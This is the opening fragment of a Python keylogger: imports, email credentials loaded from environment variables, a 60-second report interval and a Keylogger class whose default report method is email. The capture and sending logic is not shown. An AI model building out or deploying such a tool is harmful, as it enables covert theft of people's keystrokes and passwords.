import keyboard
import smtplib
from threading import Timer
from datetime import datetime
import os
from dotenv import load_dotenv

load_dotenv()

SEND_RESULTS = 60
email_address = os.getenv("EMAIL_ADDRESS")
password = os.getenv("EMAIL_PASSWORD")

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()